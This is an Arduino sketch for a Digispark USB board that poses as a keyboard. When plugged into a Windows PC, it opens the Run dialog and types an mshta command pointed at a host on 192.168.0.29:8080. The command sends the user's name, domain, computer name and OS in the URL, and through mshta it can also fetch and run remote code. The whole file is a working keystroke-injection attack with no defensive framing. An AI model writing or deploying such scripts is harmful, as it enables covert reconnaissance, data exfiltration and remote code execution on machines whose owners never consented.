#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0); // Init
  delay(1000);

  // Open Run (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(500);

  // Type: cmd /c start 
  DigiKeyboard.print("cmd /c start ");
  
  // Type: "" using SHIFT + 2 for UK double quotes
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); // "
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); // "
  DigiKeyboard.print(" mshta ");
  
  // Open "
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // Type URL
  DigiKeyboard.print("http://192.168.0.29:8080/report?user=%USERNAME%&domain=%USERDOMAIN%&pc=%COMPUTERNAME%&os=%OS%");

  // Close "
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // Press Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  delay(3000); // Wait for the request to send

  // Blink LED to signal it's done
  pinMode(1, OUTPUT);
  for (int i = 0; i < 5; i++) {
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(1, LOW);
    delay(200);
  }
}

void loop() {}